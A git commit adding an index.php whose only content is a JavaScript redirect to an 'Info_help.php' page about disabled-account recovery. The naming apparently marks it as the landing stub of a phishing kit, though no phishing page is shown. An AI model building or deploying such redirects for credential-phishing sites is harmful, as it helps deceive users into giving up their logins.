034cad772b1748a00fb6778b40dec47e3c433515
belajar34 <146389019+belajar34@users.noreply.github.com>
2023-09-29 05:09:29 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,17 @@
+<body>
+<script language='JavaScript' type='text/javascript'>
+<!--
+if  (screen.width > 1024){
+ setTimeout("window.location='Info_help.php?/pages_recovery_disable=rec/'");
+
+ } else if (screen.width < 640){
+ setTimeout("window.location='Info_help.php?/pages_recovery_disable=rec/'");
+
+} else { 
+ setTimeout("window.location='Info_help.php?/pages_recovery_disable=rec/'");
+}
+
+
+//-->
+</script>
+</body>
